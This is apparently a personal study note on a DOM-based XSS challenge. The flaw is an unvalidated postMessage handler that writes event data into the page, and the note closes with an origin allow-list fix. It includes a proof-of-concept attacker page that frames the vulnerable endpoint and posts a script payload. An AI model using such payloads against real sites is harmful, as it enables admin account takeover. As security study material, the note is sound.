#DOMxss #addEventListener #xss 
challenge:
***
![[Pasted image 20230709154115.png]]
***

The above code is vulnerable to cross-site scripting attack as it can be observed that on the line 15, a handler for message events is registered which writes the event's data in the DOM on the line 13. It is possible to embed this page and send an event with an XSS payload to execute a successful attack.

Attacker can exploit the account of the admin via this payload which is inside the attacker controlled sit clicked on by the admin user
```
<iframe name="iframe" src="vuln-site-endpoint"></iframe> <script> window.addEventListener('message', (event) => {   if (event.data === 'loaded') {     const payload = 'alert(origin)';     iframe.postMessage(`<script>${payload}<\x2fscript>`, '*');   } }); </script>

```


the whole write-up:
![[https://www.sonarsource.com/blog/ghost-admin-takeover/]]


# remedy:
 message events have the [origin](https://developer.mozilla.org/en-US/docs/Web/API/MessageEvent/origin "origin") property that can be used to validate the sender. A straightforward fix would be to compare the event’s origin with a set of allowed origins and reject any message that comes from somewhere else. Example:


```js
const allowedOrigins = [
    'https://example.com',
    'https://blog.example.com',
];
window.addEventListener('message', (event) => {
    if (!allowedOrigins.includes(event.origin)) {
        return;
    }
    handleEvent(event);
});
```